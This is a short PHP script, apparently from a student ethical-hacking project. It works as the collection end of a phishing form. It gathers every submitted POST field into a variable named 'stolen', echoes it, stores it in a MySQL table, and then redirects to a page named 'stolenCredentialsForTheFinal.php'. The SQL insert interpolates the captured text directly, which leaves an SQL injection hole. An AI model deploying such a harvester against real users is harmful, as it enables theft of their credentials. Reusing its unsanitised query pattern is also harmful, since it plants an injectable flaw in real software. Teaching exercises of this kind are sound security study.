<?php

echo "hello: ";

$stolen =  "";

foreach($_POST as $key => $value)
{
	echo " " . $key . ": " . $value;
	$stolen .= " " . $key . ": " . $value . " & ";
}

echo "stolen : " . "$stolen";

$servername = "localhost";
$username = "";	// username and password is left blank
$password = "";
$dbname = "ethicalHacking";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
	
	echo "connection failed! (This should not happen ...) ";
    die("Connection failed: ");
	exit();
}

$sql = "INSERT INTO `ethicalHacking`.`projectDB` (`id`, `form`) VALUES (NULL, '$stolen');";

if ($conn->query($sql) === TRUE) {
    echo "New record created successfully";
} else {
	echo "connection failed! (This should not happen ...) ";
	$conn->close();
	exit();
}

	
	echo "</br>";
	echo "</br>";
	echo "</br>";
	echo "</br>";
	echo "</br>";
	echo "HACKING IN PROGRES...";
	echo "YOU ARE BEING REDIRECTED NOW!";
	header('Refresh: 2;url=stolenCredentialsForTheFinal.php');
	
?>


